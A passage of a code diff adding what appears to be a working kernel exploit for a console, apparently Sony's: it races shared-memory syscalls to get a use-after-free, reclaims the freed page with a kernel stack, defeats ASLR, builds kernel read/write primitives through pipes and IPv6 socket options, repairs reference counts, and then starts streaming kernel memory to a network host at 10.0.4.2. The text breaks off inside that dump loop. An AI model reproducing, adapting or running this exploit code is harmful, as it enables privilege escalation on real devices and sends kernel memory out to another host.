+            //thread_lookup.push_write8(thread_data_lookup_fd, new int64(0x45454545, 0x46464646));
+            thread_lookup.increment_dword(thread_data_lookup_counter);
+
+            const label_waitreset = thread_lookup.get_rsp();
+            const cond_waitreset = thread_lookup.create_branch(thread_lookup.branch_types.EQUAL, thread_data_reset_all, 1);
+            const label_restart = thread_lookup.get_rsp();
+            thread_lookup.jmp_to_rsp(label_a);
+
+            const label_e = thread_lookup.get_rsp();
+
+            // Set branch points
+            thread_lookup.set_branch_points(cond_stop, label_e, label_b);
+            thread_lookup.set_branch_points(cond_run, label_c, label_a);
+            thread_lookup.set_branch_points(cond_ready, label_d, label_wait);
+            thread_lookup.set_branch_points(cond_waitreset, label_restart, label_waitreset);
+        }
+
+        // Create threads (they will hang on waiting for run flag)
+        var pthread_destroyer_0 = await thread_destroyer_0.spawn_thread();
+        var pthread_destroyer_1 = await thread_destroyer_1.spawn_thread();
+        var pthread_lookup = await thread_lookup.spawn_thread();
+
+        await sleep(1);
+
+        debug_log("[+] destroyer0 (cpu=0x" + p.read8(thread_data_destroyer_0_cpu) + "), destroyer1 (cpu=0x" + p.read8(thread_data_destroyer_1_cpu) + "), lookup (cpu=0x" + p.read8(thread_data_lookup_cpu) + ")");
+        debug_log("[+] triggering race");
+
+        ///////////////////////////////////////////////////////////////////////
+        // Stage 1: Trigger race
+        ///////////////////////////////////////////////////////////////////////
+
+        async function umtx_shm_create(key) {
+            let ret = await chain.syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_CREAT, key);
+            return ret;
+        }
+
+        async function umtx_shm_destroy(key) {
+            let ret = await chain.syscall(SYS__UMTX_OP, 0, UMTX_OP_SHM, UMTX_SHM_DESTROY, key);
+            return ret;
+        }
+
+        async function shm_resize_tag(fd) {
+            let ret = await chain.syscall(SYS_FTRUNCATE, fd, (fd.low * 0x4000));
+            return ret;
+        }
+
+        async function shm_close(fd) {
+            let ret = await chain.syscall(SYS_CLOSE, fd);
+            return ret;
+        }
+
+        async function check_shm_for_tagged_size(fd, original_fd) {
+            let OFFSET_STAT_SIZE = 0x48;
+
+            if (fd.low == 0xFFFFFFFF)
+                return -1;
+
+            let stat = p.malloc(0x100, 1);
+            let ret = await chain.syscall(SYS_FSTAT, fd, stat);
+
+            //debug_log("check_shm_for_tagged_size: fstat=0x" + ret + ", size=0x" + p.read8(stat.add32(OFFSET_STAT_SIZE)));
+            let tag = p.read4(stat.add32(OFFSET_STAT_SIZE));
+            if (tag & 0x3FFF) {
+                return -1;
+            }
+            tag /= 0x4000;
+            if (tag >= 0x400 || tag <= 0x6) {
+                return -1;
+            }
+
+            //debug_log("check_shm_for_tagged_size: tag=0x" + tag.toString(16) + " | fd=0x" + fd.low.toString(16) + " | orig_fd=0x" + original_fd.low.toString(16));
+
+            if (ret.low == 0 && tag != fd.low && tag != original_fd.low && tag != 0) {
+                debug_log("[+] overlapped shm regions! tag=0x" + tag.toString(16));
+                return tag;
+            }
+
+            return -1;
+        }
+
+        let winner_fd = -1;
+        let lookup_fd = -1;
+        let dead_fd = new int64(0xDEAD, 0);
+        for (let attempt = 1; attempt < 0x1000; attempt++) {
+            let original_fd = await umtx_shm_create(shm_key.add32(0x0));
+            //debug_log("[+] [" + attempt + "] original_fd=0x" + original_fd);
+            let main_fd = original_fd;
+
+            let truncate_ret = await shm_resize_tag(main_fd);
+            let close_ret = await shm_close(main_fd);
+
+            p.write8(thread_data_ready, 0);
+            p.write8(thread_data_reset_all, 0);
+
+            // Reset shm fds
+            for (let i = 1; i < cfg_spray_fds_per_thread * 2; i++) {
+                p.write8(thread_data_destroyer_fds.add32(i * 0x8), dead_fd);
+            }
+
+            p.write8(thread_data_run_all, 1);
+
+            for (; ;) {
+                if (p.read8(thread_data_ready).low == 3) {
+                    //debug_log("[+] ready threads: " + p.read8(thread_data_ready));
+                    p.write8(thread_data_run_all, 0);
+                    break;
+                }
+
+                //await sleep(1);
+            }
+
+            // Resize shm regions
+            for (let i = 1; i < cfg_spray_fds_per_thread * 2; i++) {
+                let spray_shm_fd = 0;
+                do {
+                    spray_shm_fd = p.read8(thread_data_destroyer_fds.add32(i * 0x8));
+                } while (spray_shm_fd.low == 0xDEAD);
+
+                //debug_log("spray_fds[0x" + i.toString(16) + "] = 0x" + spray_shm_fd);
+                await shm_resize_tag(spray_shm_fd);
+            }
+
+            // Wait on all counters
+            while (p.read8(thread_data_destroyer_0_counter).low != attempt) { }
+            while (p.read8(thread_data_destroyer_1_counter).low != attempt) { }
+            while (p.read8(thread_data_lookup_counter).low != attempt) { }
+
+            // Check if we won the race
+            let thr_lookup_fd = p.read8(thread_data_lookup_fd);
+            // HACK: sonys code is shit, so we need to account for the fact that ESRCH can be returned without setting error flag
+            if (thr_lookup_fd.low == 3)
+                thr_lookup_fd = new int64(0xffffffff, 0xffffffff);
+
+            winner_fd = await check_shm_for_tagged_size(thr_lookup_fd, original_fd);
+
+            // Cleanup other fds
+            for (let i = 0; i < cfg_spray_fds_per_thread * 2; i++) {
+                let spray_shm_fd = p.read4(thread_data_destroyer_fds.add32(i * 0x8));
+                if (winner_fd != spray_shm_fd) {
+                    await shm_close(spray_shm_fd);
+                }
+            }
+
+            if (winner_fd >= 0) {
+                //debug_log("[+] d0=" + p.read8(thread_data_destroyer_0_counter) + ", d1=" + p.read8(thread_data_destroyer_1_counter) + ", l=" + p.read8(thread_data_lookup_counter));
+                debug_log("[+] [" + attempt + "] breaking out of loop, we have won the race");
+                lookup_fd = thr_lookup_fd.low;
+                break;
+            } else {
+                //debug_log("[+] d0=" + p.read8(thread_data_destroyer_0_counter) + ", d1=" + p.read8(thread_data_destroyer_1_counter) + ", l=" + p.read8(thread_data_lookup_counter));
+            }
+
+            // Reset all threads for another try
+            p.write8(thread_data_reset_all, 1);
+        }
+
+        if (winner_fd >= 0)
+            debug_log("[+] lookup=0x" + lookup_fd.toString(16) + ", winner=0x" + winner_fd.toString(16));
+        else {
+            // debug_log("[!] failed to win race, retry");
+            // return;
+            throw new Error("Failed to win race, retry");
+        }
+
+        ///////////////////////////////////////////////////////////////////////
+        // Stage 2: Get page UAF
+        ///////////////////////////////////////////////////////////////////////
+
+        let spray_key = p.malloc(0x80);
+        await umtx_shm_create(spray_key.add32(0x50 * 4));
+
+        // Run a chain to close the winning FD and map on the lookup FD to get a page UAF
+        let results = p.malloc(0x10);
+        chain.add_syscall(SYS_CLOSE, winner_fd);
+        chain.write_result(results.add32(0x0));
+        chain.add_syscall(SYS_MMAP, 0, 0x4000, 0x3, 0x1, lookup_fd, 0);
+        chain.write_result(results.add32(0x8));
+
+        // Reclaim UAF page with a kernel stack
+        for (let td of kprim_threads) {
+            td.spawn_thread_chain();
+        }
+
+        //alert("going to run");
+        await chain.run();
+
+        let close_res = p.read8(results.add32(0x0));
+        let kstack = p.read8(results.add32(0x8));
+        debug_log("[+] close=0x" + close_res + ", kstack=0x" + kstack);
+
+        if (kstack.low == 0xFFFFFFFF) {
+            // debug_log("[!] failed to map kstack, retry");
+            // return;
+            throw new Error("Failed to map kstack, retry");
+        }
+
+        // Check if kstack is all zeroes, if it is we failed to reclaim
+        let kstack_valid = 0;
+        for (let i = 0; i < 0x1000; i += 0x8) {
+            let test_qword = p.read8(kstack.add32(0x3000 + i));
+            if (test_qword.low != 0 || test_qword.hi != 0) {
+                kstack_valid = 1;
+                break;
+            }
+        }
+
+        if (kstack_valid == 0) {
+            // debug_log("[+] failed to reclaim with kernel stack, halting");
+            // return;
+            throw new Error("Failed to reclaim with kernel stack, halting");
+        }
+
+        // Code to dump kernel stack to PC to look for good pointers
+        if (OFFSET_KERNEL_STACK_SYS_SCHED_YIELD_RET == 0xDEADC0DE) {
+            let data = new Uint8Array(0x1000);
+            for (let titer = 0x0; titer < 0x1000; titer++) {
+                data[titer] = p.read1(kstack.add32(0x3000 + titer));
+            }
+            debug_bin(data);
+            alert("Unsupported firmware, sent kernel stack dump");
+        }
+
+        let cookie_offset = OFFSET_KERNEL_STACK_COOKIE;
+        if (cookie_offset == 0xDEADC0DE) {
+            // Try to automatically resolve the cookie and log it
+            for (let i = 0; i < 0x1000; i += 0x8) {
+                let search_val = p.read8(kstack.add32(0x3000 + i)).low;
+                if ((search_val >> 16) == 0x1337) {
+                    cookie_offset = i;
+                }
+            }
+
+            debug_log("[+] bruteforced cookie offset=0x" + cookie_offset.toString(16));
+            alert("cookie offset = 0x" + cookie_offset.toString(16));
+        }
+
+        let kptr = 0
+        let kbase = 0;
+        let kdata_base = 0;
+        let kernel_sysent_addr = new int64(0, 0);
+        if (OFFSET_KERNEL_SYS_SCHED_YIELD_RET != 0xDEADC0DE) {
+            kptr = p.read8(kstack.add32(0x3000 + OFFSET_KERNEL_STACK_SYS_SCHED_YIELD_RET));
+            kbase = kptr.sub32(OFFSET_KERNEL_SYS_SCHED_YIELD_RET);
+            kdata_base = kbase.add32(OFFSET_KERNEL_DATA);
+            debug_log("[+] defeated aslr, kernel base: 0x" + kbase + " (kdata base: 0x" + kdata_base + ")");
+        } else {
+            let ret_offset = prompt("Unsupported firmware, give a stack offset of return address in hex");
+            ret_offset = parseInt(ret_offset.replace("0x", ""), 16);
+            kptr = p.read8(kstack.add32(0x3000 + ret_offset));
+
+            // Find the sysent pointer
+            for (let i = 0; i < 0x1000; i++) {
+                let code = p.read4(kstack.add32(0x3000 + i));
+                if (code != 0x14B)
+                    continue;
+
+                let check_cookie = p.read2(kstack.add32(0x3000 + i + 0x12));
+                if (check_cookie != 0x1337)
+                    continue;
+
+                kernel_sysent_addr = p.read8(kstack.add32(0x3000 + i + 0x08));
+                break;
+            }
+
+            if (kptr.hi != 0xFFFFFFFF) {
+                // debug_log("[!] kptr addr looks invalid (0x" + kptr + "), bad return address offset, halting (hi=0x" + kptr.hi.toString(16) + ")");
+                // return;
+                throw new Error("kptr addr looks invalid (0x" + kptr + "), bad return address offset, halting (hi=0x" + kptr.hi.toString(16) + ")");
+            }
+
+            if (kernel_sysent_addr.hi != 0xFFFFFFFF) {
+                // debug_log("[!] sysent addr looks invalid (0x" + kernel_sysent_addr + "), halting (hi=0x" + kernel_sysent_addr.hi.toString(16) + ")");
+                // return;
+                throw new Error("sysent addr looks invalid (0x" + kernel_sysent_addr + "), halting (hi=0x" + kernel_sysent_addr.hi.toString(16) + ")");
+            }
+
+            debug_log("[+] unsupported fw, assuming ret_offset=0x" + ret_offset.toString(16));
+        }
+
+        // Find the thread that reclaimed and destroy others
+        let cookie = p.read8(kstack.add32(0x3000 + cookie_offset)).low;
+        debug_log("[+] found kstack, cookie=0x" + cookie.toString(16));
+
+        if ((cookie >> 16) != 0x1337) {
+            // debug_log("[!] bad cookie (0x" + cookie.toString(16) + "), retry");
+            // return;
+            throw new Error("bad cookie (0x" + cookie.toString(16) + "), retry");
+        }
+
+        let kprim_thread_id = cookie & 0xFFFF;
+        p.write8(kprim_thread_data_neo, kprim_thread_id);
+        p.write8(kprim_thread_data_neo_found, 1);
+
+        await sleep(4);
+
+        for (let i = 0; i < cfg_num_kprim_threads; i++) {
+            let bmp_offset = i * 0x8;
+            let is_exited = p.read8(kprim_thread_data_exit_bmp.add32(bmp_offset)).low;
+            if (is_exited != 1 && i != kprim_thread_id) {
+                debug_log("[!] unexpected thread behavior, thread 0x" + i.toString(16) + " is not the one");
+            }
+        }
+
+        stop_all_threads();
+
+        ///////////////////////////////////////////////////////////////////////
+        // Stage 3: Kernel arbitrary read/write via pipe+stack
+        ///////////////////////////////////////////////////////////////////////
+
+        async function send_cmd_to_kprim_thread(cmd, uaddr, kaddr) {
+            // Take the thread out of reset
+            p.write8(kprim_thread_data_reset, 0);
+
+            // Set args
+            p.write8(kprim_thread_data_uaddr, uaddr);
+            p.write8(kprim_thread_data_kaddr, kaddr);
+            //p.write8(kprim_thread_data_len, len);
+
+            // Set command, we do this last because it kickstarts the thread to do stuff
+            p.write8(kprim_thread_data_cmd, cmd);
+
+            await nanosleep(10000000); // 10ms
+            //debug_log("[+] kprim send (" + cmd + ", 0x" + uaddr + ", 0x" + kaddr + ") read=0x" + p.read8(kprim_thread_data_read_counter) + ", write=0x" + p.read8(kprim_thread_data_write_counter));
+
+            // Command is done, clear the command and put the thread into reset
+            p.write8(kprim_thread_data_cmd, KPRIM_NOP);
+            p.write8(kprim_thread_data_reset, 1);
+        }
+
+        function update_iov_in_kstack(orig_iov_base, new_iov_base, uio_segflg, is_write) {
+            let OFFSET_IOV_BASE = 0x00;
+            let OFFSET_IOV_LEN = 0x08;
+            let SIZE_IOV = 0x10;
+            let OFFSET_UIO_IOV = 0x00;
+            let OFFSET_UIO_IOVCNT = 0x08;
+            let OFFSET_UIO_OFFSET = 0x10;
+            let OFFSET_UIO_RESID = 0x18;
+            let OFFSET_UIO_SEGFLG = 0x20;
+            let OFFSET_UIO_RW = 0x24;
+            let OFFSET_UIO_TD = 0x28;
+            let search_iov_base = orig_iov_base;
+            let search_iov_len = kprim_read_size;
+
+            // Find iov+uio pair on the stack
+            let stack_iov_offset = -1;
+
+            for (let i = 0; i < 0x1000; i += 0x8) {
+                let possible_iov_base = p.read8(kstack.add32(0x3000 + i + OFFSET_IOV_BASE));
+                let possible_iov_len = p.read8(kstack.add32(0x3000 + i + OFFSET_IOV_LEN));
+
+                /*if (i > 0x700 && i < 0x800) {
+                    debug_log("update_iov_in_kstack i=0x" + i.toString(16) + ", possible iov=0x" + possible_iov_base + ", len=0x" + possible_iov_len);
+                }*/
+                if (possible_iov_base.high == search_iov_base.high && possible_iov_base.low == search_iov_base.low &&
+                    possible_iov_len.low == search_iov_len) {
+                    let possible_uio_resid = p.read8(kstack.add32(0x3000 + i + SIZE_IOV + OFFSET_UIO_RESID));
+                    let possible_uio_segflg = p.read4(kstack.add32(0x3000 + i + SIZE_IOV + OFFSET_UIO_SEGFLG));
+                    let possible_uio_rw = p.read4(kstack.add32(0x3000 + i + SIZE_IOV + OFFSET_UIO_RW));
+
+                    //debug_log("update_iov_in_kstack, possible uio_resid=0x" + possible_uio_resid + ", uio_segflg=0x" + possible_uio_segflg.toString(16) + ", uio_rw=0x" + possible_uio_rw.toString(16));
+
+                    if (possible_uio_resid.low == search_iov_len && possible_uio_segflg == 0 && possible_uio_rw == is_write) {
+                        //debug_log("[+] found iov on stack @ 0x" + i.toString(16));
+                        stack_iov_offset = i;
+                        break;
+                    }
+                }
+            }
+
+            if (stack_iov_offset < 0) {
+                debug_log("[!] failed to find iov");
+                return -1;
+            }
+
+            // Modify iov for kernel address + r/w
+            p.write8(kstack.add32(0x3000 + stack_iov_offset + OFFSET_IOV_BASE), new_iov_base);
+            p.write4(kstack.add32(0x3000 + stack_iov_offset + SIZE_IOV + OFFSET_UIO_SEGFLG), uio_segflg);
+            return 0;
+        }
+
+        async function slow_copyout(kaddr, uaddr) {
+            // Fill pipe up to max
+            for (let i = 0; i < pipe_size; i += 0x1000) {
+                await chain.syscall(SYS_WRITE, pipe_slow_write_fd, pipe_scratch_buf, 0x1000);
+            }
+
+            // Signal other thread to write using size we want, the thread will hang until we read
+            await send_cmd_to_kprim_thread(KPRIM_READ, uaddr, kaddr);
+
+            if (update_iov_in_kstack(pipe_scratch_buf, kaddr, 1, 1) < 0)
+                return;
+
+            // Read garbage filler data
+            let received_bytes = await chain.syscall(SYS_READ, pipe_slow_read_fd, pipe_scratch_buf, 0x10000);
+
+            // Read kernel data
+            return await chain.syscall(SYS_READ, pipe_slow_read_fd, uaddr, kprim_read_size);
+        }
+
+        async function slow_copyin(uaddr, kaddr) {
+            // Signal other thread to read using size we want, the thread will hang until we write
+            await send_cmd_to_kprim_thread(KPRIM_WRITE, uaddr, kaddr);
+
+            if (update_iov_in_kstack(pipe_scratch_buf, kaddr, 1, 0) < 0)
+                return;
+
+            // Write data to write to pointer
+            return await chain.syscall(SYS_WRITE, pipe_slow_write_fd, uaddr, 0x8);
+        }
+
+        let slow_kr_page_store = p.malloc(0x4000);
+        let slow_kr_qword_store = p.malloc(0x8);
+        let slow_kw_qword_store = p.malloc(0x8);
+
+        async function kernel_slow_write8(kaddr, val) {
+            p.write8(slow_kw_qword_store, val);
+            await slow_copyin(slow_kw_qword_store, kaddr);
+        }
+
+        async function kernel_slow_read8(kaddr) {
+            await slow_copyout(kaddr, slow_kr_qword_store);
+            return p.read8(slow_kr_qword_store);
+        }
+
+        async function kernel_slow_readpage(kaddr) {
+            for (let i = 0; i < 0x4000; i += kprim_read_size)
+                await slow_copyout(kaddr.add32(i), slow_kr_page_store.add32(i));
+            return slow_kr_page_store;
+        }
+
+        async function kernel_readstr(kaddr) {
+            await slow_copyout(kaddr, slow_kr_qword_store);
+            let str = "";
+            for (let i = 0; i < 8; i++) {
+                let c = p.read1(slow_kr_qword_store.add32(i));
+                if (c == 0x0) {
+                    break;
+                }
+                str += String.fromCharCode(c);
+            }
+            return str;
+        }
+
+        // If this is running on a firmware that doesn't have good kernel offsets, find kernel data base
+        let save_presumed_kdata_base = 0;
+        if (OFFSET_KERNEL_DATA == 0xDEADC0DE) {
+            // Code for firmwares where finding kernel offsets is tricky, we take a known data
+            // pointer from the stack, page align, and search backwards for a pattern in rodata
+            // 01 00 00 00 01 00 00 00
+            let estimate_min_pages = 0x0;
+            let kernel_data_page = kernel_sysent_addr.and32(0xFFFFC000);
+
+            let presumed_kdata_base = 0;
+            save_presumed_kdata_base = presumed_kdata_base;
+            if (presumed_kdata_base == 0) {
+                alert("Trying to bruteforce kernel base (addr=0x" + kernel_data_page + ", minpages=0x" + estimate_min_pages.toString(16) + "), this can take a while...");
+                debug_log("[+] don't have kernel offsets, trying to bruteforce kernel base (minpages=0x" + estimate_min_pages.toString(16) + "), this can take a while...");
+                for (let i = (estimate_min_pages * 0x4000); ; i += 0x4000) {
+                    let test_kernel_addr = kernel_data_page.sub32(i);
+                    debug_log("[+] trying read @ i=0x" + i.toString(16) + ", addr=0x" + test_kernel_addr);
+
+                    let data1 = await kernel_slow_read8(test_kernel_addr.add32(0x00));
+                    if (data1.low != 1 || data1.hi != 1) {
+                        continue;
+                    }
+
+                    let data2 = await kernel_slow_read8(test_kernel_addr.add32(0x08));
+                    if (data2.low != 0 || data2.hi != 0) {
+                        continue;
+                    }
+
+                    let data3 = await kernel_slow_read8(test_kernel_addr.add32(0x10));
+                    debug_log("[+] data1=0x" + data1 + ", data2=0x" + data2 + ", data3=0x" + data3);
+
+                    if (data3.hi == 0xFFFFFFFF) {
+                        presumed_kdata_base = test_kernel_addr;
+                        //account for the .hv region still existing [3.00;4.51]
+                        if (window.fw_float >= 3.00 && window.fw_float < 5.00) {
+                            presumed_kdata_base.sub32inplace(0x10000);
+                        }
+
+                        debug_log("[+] found kdata base: 0x" + presumed_kdata_base + " (i=0x" + i.toString(16) + ")");
+                        save_presumed_kdata_base = presumed_kdata_base;
+                        break;
+                    }
+                }
+            }
+
+            /*
+            debug_log("[+] kptr=0x" + kptr);
+            let ktext_base = presumed_kdata_base.sub32(0xC50000);
+            let sys_sched_yield_ret_off = kptr.low - ktext_base.low;
+            debug_log("[+] sched_yield_ret offset=0x" + sys_sched_yield_ret_off.toString(16));
+            alert("sched_yield_ret offset=0x" + sys_sched_yield_ret_off.toString(16));
+            */
+        }
+
+        ///////////////////////////////////////////////////////////////////////
+        // Stage 3: Bigger & better kernel arbitrary read/write
+        ///////////////////////////////////////////////////////////////////////
+
+        //alert("stage 3 - kdata_base=0x" + kdata_base);
+
+        // Current process addr can be found in kstack
+        let thr_ptr_offset = cookie_offset + 0x140;
+        let curthr_addr = p.read8(kstack.add32(0x3000 + thr_ptr_offset));
+        let curproc_addr = await kernel_slow_read8(curthr_addr.add32(0x8));   // td_proc
+        let proc_ucred_addr = await kernel_slow_read8(curproc_addr.add32(0x40)); // p_ucred (ucred)
+        let proc_fd_addr = await kernel_slow_read8(curproc_addr.add32(0x48)); // p_fd (filedesc)
+
+        if (proc_ucred_addr == 0 || proc_fd_addr == 0) {
+            // debug_log("[!] failed to find process");
+            // return;
+            throw new Error("Failed to find process");
+        }
+
+        debug_log("[+] curproc_addr=0x" + curproc_addr);
+        debug_log("[+] found proc->p_ucred=0x" + proc_ucred_addr + ", proc->p_fd=0x" + proc_fd_addr);
+
+        let ofiles_addr = await kernel_slow_read8(proc_fd_addr.add32(0x00)); // fd_files
+        ofiles_addr.add32inplace(0x08); // account for fdt_nfiles
+
+        /*
+         * Pipe blocking-based r/w we have works but isn't great, it's slow and
+         * relies on a worker thread. We'll escalate that r/w into a better one
+         * by using an ipv6 socket pair as a r/w window into a pipe pair, so
+         * we can use ipv6 sockets to set addresses and pipe pair for r/w data.
+         */
+
+
+        let master_target_buffer = p.malloc(0x14);
+        let slave_buffer = p.malloc(0x14);
+        let pipemap_buffer = p.malloc(0x14);
+        let pktinfo_size_store = p.malloc(0x8);
+        p.write8(pktinfo_size_store, 0x14);
+
+        // Create ipv6 socket pair
+        let master_sock = (await chain.syscall(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)).low;
+        let victim_sock = (await chain.syscall(SYS_SOCKET, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)).low;
+        let x1 = await chain.syscall(SYS_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14);
+        let x2 = await chain.syscall(SYS_SETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14);
+
+        // Find sockets and get pktopts-based r/w
+        let master_sock_filedescent_addr = ofiles_addr.add32(master_sock * 0x30);
+        let victim_sock_filedescent_addr = ofiles_addr.add32(victim_sock * 0x30);
+
+        let master_sock_file_addr = await kernel_slow_read8(master_sock_filedescent_addr);
+        let victim_sock_file_addr = await kernel_slow_read8(victim_sock_filedescent_addr);
+
+        let master_sock_socket_addr = await kernel_slow_read8(master_sock_file_addr);
+        let victim_sock_socket_addr = await kernel_slow_read8(victim_sock_file_addr);
+
+        let master_pcb = await kernel_slow_read8(master_sock_socket_addr.add32(0x18));
+        let slave_pcb = await kernel_slow_read8(victim_sock_socket_addr.add32(0x18));
+
+        let master_pktopts = await kernel_slow_read8(master_pcb.add32(0x120));
+        let slave_pktopts = await kernel_slow_read8(slave_pcb.add32(0x120));
+
+        await kernel_slow_write8(master_pktopts.add32(0x10), slave_pktopts.add32(0x10));
+
+        async function write_to_victim(addr) {
+            p.write8(master_target_buffer.add32(0x00), addr);
+            p.write8(master_target_buffer.add32(0x08), 0);
+            p.write4(master_target_buffer.add32(0x10), 0);
+            await chain.syscall(SYS_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14);
+        }
+
+        async function ipv6_kread(addr, buffer) {
+            await write_to_victim(addr);
+            await chain.syscall(SYS_GETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, pktinfo_size_store);
+        }
+
+        async function ipv6_kwrite(addr, buffer) {
+            await write_to_victim(addr);
+            await chain.syscall(SYS_SETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer, 0x14);
+        }
+
+        async function ipv6_kread8(addr) {
+            await ipv6_kread(addr, slave_buffer);
+            return p.read8(slave_buffer);
+        }
+
+        // Create pipe pair and ultimate r/w prims
+        let pipe_mem = p.malloc(0x8);
+        await chain.syscall(SYS_PIPE2, pipe_mem, 0);
+
+        let pipe_read = p.read4(pipe_mem);
+        let pipe_write = p.read4(pipe_mem.add32(0x4));
+        let pipe_filedescent = ofiles_addr.add32(pipe_read * 0x30);
+        let pipe_file = await ipv6_kread8(pipe_filedescent);
+        let pipe_addr = await ipv6_kread8(pipe_file);
+
+        async function copyout(src, dest, length) {
+            if (typeof copyout.value == 'undefined') {
+                copyout.value0 = new int64(0x40000000, 0x40000000);
+                copyout.value1 = new int64(0x00000000, 0x40000000);
+            }
+            p.write8(pipemap_buffer, copyout.value0);
+            p.write8(pipemap_buffer.add32(0x8), copyout.value1);
+            p.write4(pipemap_buffer.add32(0x10), 0x0);
+            await ipv6_kwrite(pipe_addr, pipemap_buffer);
+
+            p.write8(pipemap_buffer, src);
+            p.write8(pipemap_buffer.add32(0x8), 0x0);
+            p.write4(pipemap_buffer.add32(0x10), 0x0);
+            await ipv6_kwrite(pipe_addr.add32(0x10), pipemap_buffer);
+
+            return await chain.syscall(SYS_READ, pipe_read, dest, length);
+        }
+
+        async function copyin(src, dest, length) {
+            if (typeof copyin.value == 'undefined') {
+                copyin.value = new int64(0x00000000, 0x40000000);
+            }
+
+            p.write8(pipemap_buffer, 0x0);
+            p.write8(pipemap_buffer.add32(0x8), copyin.value);
+            p.write4(pipemap_buffer.add32(0x10), 0x0);
+            await ipv6_kwrite(pipe_addr, pipemap_buffer);
+
+            p.write8(pipemap_buffer, dest);
+            p.write8(pipemap_buffer.add32(0x8), 0x0);
+            p.write4(pipemap_buffer.add32(0x10), 0x0);
+            await ipv6_kwrite(pipe_addr.add32(0x10), pipemap_buffer);
+
+            return await chain.syscall(SYS_WRITE, pipe_write, src, length);
+        }
+
+        let krw_qword_store = p.malloc(0x8);
+
+        async function kernel_write8(kaddr, val) {
+            p.write8(krw_qword_store, val);
+            await copyin(krw_qword_store, kaddr, 0x8);
+        }
+
+        async function kernel_write4(kaddr, val) {
+            p.write4(krw_qword_store, val);
+            await copyin(krw_qword_store, kaddr, 0x4);
+        }
+
+        async function kernel_write2(kaddr, val) {
+            p.write2(krw_qword_store, val);
+            await copyin(krw_qword_store, kaddr, 0x2);
+        }
+
+        async function kernel_write1(kaddr, val) {
+            p.write1(krw_qword_store, val);
+            await copyin(krw_qword_store, kaddr, 0x1);
+        }
+
+        async function kernel_read8(kaddr) {
+            await copyout(kaddr, krw_qword_store, 0x8);
+            return p.read8(krw_qword_store);
+        }
+
+        async function kernel_read4(kaddr) {
+            await copyout(kaddr, krw_qword_store, 0x4);
+            return p.read4(krw_qword_store);
+        }
+
+        async function kernel_read2(kaddr) {
+            await copyout(kaddr, krw_qword_store, 0x2);
+            return p.read2(krw_qword_store);
+        }
+
+        async function kernel_read1(kaddr) {
+            await copyout(kaddr, krw_qword_store, 0x1);
+            return p.read1(krw_qword_store);
+        }
+
+        ///////////////////////////////////////////////////////////////////////
+        // Stage 4: Fix-up
+        ///////////////////////////////////////////////////////////////////////
+
+        /*
+         * Increase refcounts on socket fds which we corrupt
+         */
+
+        async function inc_socket_refcount(target_fd) {
+            let filedescent_addr = ofiles_addr.add32(target_fd * 0x30);
+            let file_addr = await kernel_read8(filedescent_addr.add32(0x00)); // fde_file
+            let file_data_addr = await kernel_read8(file_addr.add32(0x00));        // f_data
+            await kernel_write4(file_data_addr.add32(0x00), 0x100);                  // so_count
+        }
+
+        await inc_socket_refcount(master_sock);
+        await inc_socket_refcount(victim_sock);
+        debug_log("[+] leaked references on ipv6 r/w sockets");
+
+        /* 
+         * We need to increase the refcount on the fd that acquires kernel stack space
+         */
+
+        // Increase refcount on lookup fd so the kernel stack region doesn't get cleaned up on proc exit
+        let filedescent_addr = ofiles_addr.add32(lookup_fd * 0x30); // fdt_ofiles[fd], sizeof(filedescent) = 0x30
+        let file_addr = await kernel_read8(filedescent_addr.add32(0x00)); // fde_file
+        let file_data_addr = await kernel_read8(file_addr.add32(0x00));        // f_data
+        await kernel_write8(file_data_addr.add32(0x10), 0x10);                   // shm_refs
+        await kernel_write8(file_addr.add32(0x28), 0x10);                        // f_count
+
+        let close_test_res = await shm_close(lookup_fd);
+        debug_log("[+] leaked references on shm for fixup, close=0x" + close_test_res);
+
+        /*
+         * We also need to zero the thread kstack for the kernel prim thread
+         */
+        let thr_kstack_obj = await kernel_read8(curthr_addr.add32(0x468)); //td_kstack_obj
+        await kernel_write8(curthr_addr.add32(0x470), 0); //td_kstack
+        await kernel_write4(thr_kstack_obj.add32(0x84), 0x10); //ref_count
+
+        debug_log("[+] fixes applied");
+
+        ///////////////////////////////////////////////////////////////////////
+        // Stage 5: Post-exploitation
+        ///////////////////////////////////////////////////////////////////////
+
+        let force_kdata_dump = 0;
+        if (OFFSET_KERNEL_DATA == 0xDEADC0DE || force_kdata_dump == 1) {
+            if (force_kdata_dump) {
+                save_presumed_kdata_base = kdata_base;
+                debug_log("[+] kernel .data dump forced, dumping");
+            } else {
+                debug_log("[+] don't have kernel offsets, entering path to dump kernel .data");
+            }
+
+            let DUMP_NET_ADDR = aton("10.0.4.2");
+            let DUMP_NET_PORT = htons(5656);
+
+            let dump_sock_addr_store = p.malloc(0x10, 1);
+            let dump_sock_send_sz_store = p.malloc(0x4, 1);
+            let dump_sock_connected = 0;
+
+            let dump_sock_fd = await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0);
+            debug_log("[+] opened dump sock=0x" + dump_sock_fd);
+
+            for (let i = 0; i < 0x10; i += 0x8) {
+                p.write8(dump_sock_addr_store.add32(i), 0);
+            }
+
+            build_addr(dump_sock_addr_store, AF_INET, DUMP_NET_PORT, DUMP_NET_ADDR);
+
+            async function dump_net(buf, size) {
+                p.write4(dump_sock_send_sz_store, size);
+
+                if (dump_sock_connected == 0) {
+                    debug_log("[+] connecting to dump server...");
+                    let connect_res = await chain.syscall(SYS_CONNECT, dump_sock_fd, dump_sock_addr_store, 0x10);
+                    debug_log("[+] connected dump sock=0x" + connect_res);
+                    dump_sock_connected = 1;
+                }
+
+                await chain.syscall(SYS_WRITE, dump_sock_fd, buf, size);
+                await chain.run();
+            }
+
+            let dump_addr = save_presumed_kdata_base;
+            let dump_page = p.malloc(0x4000);
+
+            alert("About to dump kernel .data (0x" + dump_addr + "), ensure dump server is running...");
+            debug_log("[+] dumping kernel .data (0x" + dump_addr + ") until crash");
+            for (let j = 0; ; j++) {
+                await copyout(dump_addr, dump_page, 0x4000);
